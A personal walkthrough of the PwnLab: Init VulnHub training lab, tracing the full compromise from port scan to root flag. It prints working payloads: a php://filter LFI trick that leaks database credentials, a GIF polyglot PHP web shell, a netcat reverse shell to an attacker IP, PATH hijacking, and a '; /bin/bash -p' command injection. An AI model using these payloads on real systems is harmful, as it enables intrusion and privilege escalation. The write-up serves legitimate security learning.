# PwnLab: Init

https://www.vulnhub.com/entry/pwnlab-init,158/

Another lab taken from [abatchy's list](https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms) of OSCP-like vulnhub instances.

## Port Recon

An all port scan gives:

```bash
kali@kali:~$ nmap -p- 192.168.1.70
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-29 01:13 EDT
Nmap scan report for 192.168.1.70
Host is up (0.016s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
3306/tcp  open  mysql
59496/tcp open  unknown
```

MySql and ssh both require creds. The rcpbind instance, when scanned more deeply, reveals nothing but rcpbind and 'status' listening on a variety of ports, including that 59496 port. At this stage, this means the only port of instance is 80.

## 'PwnLab Intranet Image hosting'

The website is a a simple site that allows image uploading for logged in users. A dirb, nikto, wfuzz all reveal:

- four apparent pages: index.php, login.php, upload.php and config.php. The last doesn't render anything, but does reveal a 200 code if visited.
- two directories that are listable: /upload/ and /images/ (the latter hosts the site's banner)

Importantly, the base page doesn't actually link to the others; instead it uses a `?page=` query string parameter that appears to load the other page content. I tried various attempted LFI techniques (local file inclusion) but none worked.

## A hint

I was stuck at this point. I don't like going for hints, but if I can't make any headway I go and skim someone elses walkthrough, or ask a friend. Typically its useful as I am new at this, and there is a lot I know I don't know and which I won't be able to figure out regardless of how much I bang my head against it. So, as long as I have had a good go at it, I view looking for a hint as being a learning opportunity.

It definitely was in this case; I wouldn't have guessed you can use a php filter with a LFI opportunity:

1. The use of ?page= indicates the core index page is loading the PHP from the indicated file and rendering it.
2. When dealing with LFI with PHP, there are a variety of techniques (e.g. documented here on [this nice medium post](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601))
3. After testing one or two, the one that worked was the use of a php filter with base 64 encoding.

Using a filter, when the site loaded the local resource (it would still only work with its local, defined resources), I could get it to output the base64 encoded content of the indicated reource, e.g. the config file:

`http://192.168.1.70/?page=php://filter/convert.base64-encode/resource=config` (rather than `?page=config`)

This prints the string on the page: `PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+` which decodes to (I used burp decoder):

```php
<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```

These credentials will be useful in the next step.

Additionally, I can decode the relevant section of index.php to see how this all works:

```php
if (isset($_GET['page']))
	{
		include($_GET['page'].".php");
	}
```

## MySql and login

I can use the credentials above to log into mysql remotely (`mysql -h <ip> -u root -p` plus the password from above). It contained a single table of note, containing the users for the site with encoded passwords:

```bash
MySQL [Users]> select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |                                                                                                                                                                                                 
| mike | U0lmZHNURW42SQ== |                                                                                                                                                                                                 
| kane | aVN2NVltMkdSbw== |                                                                                                                                                                                                 
+------+------------------+                                                                                                                                                                                                 
3 rows in set (0.001 sec)       
```

The encoding is obviously base64, though I can determine this for sure using the trick above to get the login page source code:

```php
$luser = $_POST['user'];
$lpass = base64_encode($_POST['pass']);

$stmt = $mysqli->prepare("SELECT * FROM users WHERE user=? AND pass=?");
```

Choosing kane (obviously, my Brotherhood of Nod allegience is strong), his password is decoded to `iSv5Ym2GRo`. I use this to log into the site.

## Bypassing the Image Uploader

After logging in, I can access the upload screen. An obvious first test is whether I can just upload a PHP shell, but it fails. Just renaming the shell also fails, so I grab the source from the upload page via the above technique:

```php
 <?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>
<html>
	<body>
		<form action='' method='post' enctype='multipart/form-data'>
			<input type='file' name='file' id='file' />
			<input type='submit' name='submit' value='Upload'/>
		</form>
	</body>
</html>
<?php 
if(isset($_POST['submit'])) {
	if ($_FILES['file']['error'] <= 0) {
		$filename  = $_FILES['file']['name'];
		$filetype  = $_FILES['file']['type'];
		$uploaddir = 'upload/';
		$file_ext  = strrchr($filename, '.');
		$imageinfo = getimagesize($_FILES['file']['tmp_name']);
		$whitelist = array(".jpg",".jpeg",".gif",".png"); 

		if (!(in_array($file_ext, $whitelist))) {
			die('Not allowed extension, please upload images only.');
		}

		if(strpos($filetype,'image') === false) {
			die('Error 001');
		}

		if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
			die('Error 002');
		}

		if(substr_count($filetype, '/')>1){
			die('Error 003');
		}

		$uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

		if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
			echo "<img src=\"".$uploadfile."\"><br />";
		} else {
			die('Error 4');
		}
	}
}

?>
```

I played around with this for a bit. My thinking was: I need to get a `.php` file up there. Either so I can include it via ?page=, or so I could just browse to it (since `/upload/` was available). However, try as I might, there was no way in the code above I could see to get a file up with the extension `.php`.

Why .php? Because the ?page include affixes a .php to the end. I tried null byte escaping, but it didn't work. Also, an image by itself (which had to be a valid image) with PHP inserted into it won't be run as PHP unless its `include`d, or is processed by PHP due to its mimetype (which, as far as I am aware, would require the php extension).

Ultimately, I needed to get another hint, and this one caused a bit of a face palm: going back to index.php, the full content is: 

```php
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
        include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
<?php
        if (isset($_GET['page']))
        {
                include($_GET['page'].".php");
        }
        else
        {
                echo "Use this server to upload and share image files inside the intranet";
        }
?>
</center>
</body>
</html>
```

I missed it! The include cookie lang statement at the top! No .php affixed there. /facepalm

## Image Polyglot and reverse shell

By setting the cookie to be `lang=../upload/<image name>.gif` or similar I could successfully include my uploaded file content onto the page. I tried just creating a jpeg and `>>` a shell onto the end, but this wasn't getting processed properly.

Ultimately I used [https://github.com/chinarulezzz/pixload](https://github.com/chinarulezzz/pixload), a nice simple tool that can create polyglot images in a variety of formats with whatever payload you want. I ran it as: `./gif.pl -payload '<?php system($_GET["cmd"]); ?>' -o shell.gif` to create an image which sailed passed the upload filter, and then when I included it via the cookie I got that magic `whoami` print `www-data` to the screen.

Using a nc reverse shell (`/?cmd=nc 192.168.1.4 4444 -e /bin/bash`) I had a command line as www-data, which I upgraded with the classic `python -c 'import pty; pty.spawn("/bin/bash")'`

## Enumeration

There seemed to be four accounts of note on the system: `mike`, `kent`, `kane` and `john`.

Going back to the mysql out from before, I tested their passwords. It worked for kent (`JWzXuBJJNy`) and kane (still `iSv5Ym2GRo`), but not mike.

The machine didn't seem to run sudo, just su, so I couldn't do a `sudo -l` as I normally would.

kane had a file called ./msgmike in his home directory, that ran as mike. Running it resulted in the following error: `cat: /home/mike/msg.txt: No such file or directory`

## Final Tricks and Flag

I got more hints here. Overall, while I learned a lot with this lab, I don't feel like I really solved it myself.

Basically:

- By putting a new command into a local file called `cat`, e.g. `echo /bin/bash > ./cat`, with `chmod 777 ./cat` and `export PATH=:./:$PATH`, when ./msgmike is run I end up with a mike shell.
- Mike has a `msg2root` command in his home dir, which when run prompts for input.
- The input is injectable: providing `; /bin/bash -p` I end up with a root shell, where I can then get the flag:

```
.-=~=-.                                                                 .-=~=-.
(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
(_ ___)  _____                             _                            (_ ___)
(__  _) /  __ \                           | |                           (__  _)
( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)
(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)
(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)
(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)
( _ __)                     __/ |                                       ( _ __)
(__  _)                    |___/                                        (__  _)
(__  _)                                                                 (__  _)
(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)
( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)
(__  _) this challenge.                                                 (__  _)
(_ ___)                                                                 (_ ___)
( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
(__  _) reading it                                                      (__  _)
(__  _)                                                                 (__  _)
(__  _)                                             For sniferl4bs.com  (__  _)
( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
(__  _)                                                                 (__  _)
(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
`-._.-'                                                                 `-._.-'
```

I learned a lot from this one, and spent a lot of time on it, but credit for the hints that got me through its should go to [https://resources.infosecinstitute.com/vulnhub-machines-walkthrough-series-pwnlab-init/](https://resources.infosecinstitute.com/vulnhub-machines-walkthrough-series-pwnlab-init/)
